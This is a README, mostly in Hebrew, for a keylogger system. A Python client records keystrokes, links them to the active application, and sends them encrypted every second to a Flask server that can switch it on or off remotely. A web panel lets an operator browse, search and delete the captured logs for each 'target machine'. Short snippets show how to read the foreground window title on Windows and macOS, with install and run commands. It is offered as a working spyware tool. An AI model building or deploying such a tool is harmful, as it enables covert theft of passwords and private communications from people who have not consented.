# Keylogger Management System

# keylogger.py (צד הלקוח)
מאזין ללחיצות מקלדת באמצעות pynput, מאגד תווים למילים (space/backspace), משייך לאפליקציה הפעילה ולחותמת זמן  
שומר לוגים מקומיים ושולח אותם מוצפנים לשרת (/api/upload) כל שנייה  
מבצע polling כל 2 שניות לשרת (/api/toggle) כדי להפעיל או לכבות  
רץ ברקע וניתן לעצור עם Ctrl+C  

# app.py (צד השרת)
שרת Flask שמקבל נתונים מוצפנים, מפענח ושומר כקבצי JSON בתיקיות data ו decrypted_data  
מספק API:  
 /api/upload              קליטת לוגים מוצפנים  
 /api/toggle              הפעלה או כיבוי לכל מכונה  
 /api/getData/<machine>   החזרת לוגים למכונה ספציפית  
 /api/getTargetMachinesList רשימת מכונות זמינות  
 /api/deleteLogs/<machine> מחיקת לוגים  
 /api/addUser /api/deleteUser /api/validateUser ניהול משתמשים  
אחסון מתבצע בתיקיות data ו decrypted_data  

# קבצי HTML
log_in.html דף כניסה לניהול משתמשים  
WebsiteView.html רשימת מכונות זמינות וכפתור התנתקות  
individualUinit.html ממשק למכונה: חיפוש, הצגה, מחיקה ורענון לוגים  

# זרימת עבודה
client שולח לוגים  
server מקבל ומפענח  
web מציג ומנהל  
המערכת רצה במקביל באמצעות threading לשליחה, polling והאזנה  

# תמיכה במערכות הפעלה
בפונקציה get_active_application:  

Windows (מושבת כברירת מחדל, להסיר #)  
if platform.system() == "Windows":  
    import win32gui  
    hwnd = win32gui.GetForegroundWindow()  
    return win32gui.GetWindowText(hwnd) or "Unknown"  
נדרש pip install pywin32  

macOS (פעיל כברירת מחדל)  
if platform.system() == "Darwin":  
    from AppKit import NSWorkspace  
    active_app = NSWorkspace.sharedWorkspace().activeApplication()  
    return active_app.get("NSApplicationName", "Unknown")  
נדרש pip install pyobjc  

בשאר המערכות מוחזר Unsupported  

# ספריות נדרשות
pip install pynput requests cryptography flask  
ב macOS יש להוסיף pip install pyobjc  
ב Windows יש להוסיף pip install pywin32  

# דרישות מערכת
Python 3.6 ומעלה  

# הוראות הרצה
צד השרת  
python app.py  
ברירת מחדל http://127.0.0.1:5000  

צד הלקוח  
python keylogger.py  
ב macOS ו Linux אין צורך בשינויים  
ב Windows יש להסיר # מהשורות של Windows, להרדים את שורות macOS ולהתקין pywin32  
